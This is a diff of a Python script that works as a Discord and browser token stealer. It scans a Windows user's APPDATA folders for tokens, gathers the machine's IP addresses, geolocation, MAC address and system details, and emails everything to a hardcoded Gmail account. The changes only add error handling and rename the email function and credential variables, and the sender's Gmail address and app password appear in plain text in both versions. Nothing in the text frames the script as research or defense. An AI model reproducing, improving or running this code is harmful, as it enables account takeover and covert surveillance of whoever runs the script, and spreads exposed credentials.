@@ -8,33 +8,16 @@ import socket
 import os
 import re
 from uuid import getnode as get_mac
-
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
-# Email credentials
-SENDER_EMAIL = "ysflnt1@gmail.com"
-APP_PASSWORD = "ncwbnpuswsemmaxw"  # Your Gmail app password here
-RECEIVER_EMAIL = "ysflnt1@gmail.com"
+# Your Gmail credentials
+GMAIL_USER = "ysflnt1@gmail.com"
+GMAIL_APP_PASSWORD = "ncwb npus wsem maxw"  # Put your Gmail app password here
 
-def send_email_smtp(subject, message):
-    msg = MIMEMultipart()
-    msg['From'] = SENDER_EMAIL
-    msg['To'] = RECEIVER_EMAIL
-    msg['Subject'] = subject
-
-    msg.attach(MIMEText(message, 'plain'))
-
-    try:
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login(SENDER_EMAIL, APP_PASSWORD)
-        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
-        server.quit()
-        print("Email sent successfully!")
-    except Exception as e:
-        print(f"Failed to send email: {e}")
+# Recipient email (can be same as sender)
+RECIPIENT_EMAIL = "ysflnt1@gmail.com"
 
 def scale(bytes, suffix="B"):
     defined = 1024
@@ -47,21 +30,37 @@ uname = platform.uname()
 bt = datetime.fromtimestamp(psutil.boot_time())
 host = socket.gethostname()
 localip = socket.gethostbyname(host)
-publicip = requests.get('https://api.ipify.org').text
-city = requests.get(f'https://ipapi.co/{publicip}/city').text
-region = requests.get(f'https://ipapi.co/{publicip}/region').text
-postal = requests.get(f'https://ipapi.co/{publicip}/postal').text
-timezone = requests.get(f'https://ipapi.co/{publicip}/timezone').text
-currency = requests.get(f'https://ipapi.co/{publicip}/currency').text
-country = requests.get(f'https://ipapi.co/{publicip}/country_name').text
-callcode = requests.get(f"https://ipapi.co/{publicip}/country_calling_code").text
-vpn = requests.get('http://ip-api.com/json?fields=proxy')
-proxy = vpn.json()['proxy']
+
+try:
+    publicip = requests.get('https://api.ipify.org').text
+except Exception:
+    publicip = "Unavailable"
+
+def get_ipapi_info(ip, field):
+    try:
+        return requests.get(f'https://ipapi.co/{ip}/{field}').text
+    except Exception:
+        return "Unavailable"
+
+city = get_ipapi_info(publicip, 'city')
+region = get_ipapi_info(publicip, 'region')
+postal = get_ipapi_info(publicip, 'postal')
+timezone = get_ipapi_info(publicip, 'timezone')
+currency = get_ipapi_info(publicip, 'currency')
+country = get_ipapi_info(publicip, 'country_name')
+callcode = get_ipapi_info(publicip, 'country_calling_code')
+
+try:
+    vpn_resp = requests.get('http://ip-api.com/json?fields=proxy')
+    proxy = vpn_resp.json().get('proxy', "Unavailable")
+except Exception:
+    proxy = "Unavailable"
+
 mac = get_mac()
 
 roaming = os.getenv('APPDATA')
 
-# Directories to search for Discord & browser tokens
+# Discord & browser directories to search tokens
 Directories = {
     'Discord': roaming + '\\Discord',
     'Discord Two': roaming + '\\discord',
@@ -94,14 +93,14 @@ def Yoink(Directory):
             continue
     return Tokens
 
-# Collect tokens
+# Collect tokens from directories
 all_tokens = []
 for name, path in Directories.items():
     if os.path.exists(path):
         tokens = Yoink(path)
         all_tokens.extend(tokens)
 
-# System info
+# Gather system info
 cpufreq = psutil.cpu_freq()
 svmem = psutil.virtual_memory()
 disk_io = psutil.disk_io_counters()
@@ -113,13 +112,13 @@ try:
     for partition in partitions:
         try:
             partition_usage = psutil.disk_usage(partition.mountpoint)
-            break
+            break  # just take the first usable partition for info
         except PermissionError:
             continue
 except:
     partition_usage = None
 
-# Format info
+# Compose collected info string
 collected_info = f"""
 Host: {host}
 Local IP: {localip}
@@ -174,5 +173,23 @@ Discord Tokens found:
 {', '.join(all_tokens) if all_tokens else "No tokens found"}
 """
 
-# Send collected info via SMTP email
-send_email_smtp("Collected System Info", collected_info)
+def send_email(subject, body):
+    msg = MIMEMultipart()
+    msg['From'] = GMAIL_USER
+    msg['To'] = RECIPIENT_EMAIL
+    msg['Subject'] = subject
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    try:
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(GMAIL_USER, GMAIL_APP_PASSWORD)
+        server.send_message(msg)
+        server.quit()
+        print("Email sent successfully!")
+    except Exception as e:
+        print("Failed to send email:", e)
+
+# Send the email with the collected info
+send_email("Collected System Info and Tokens", collected_info)
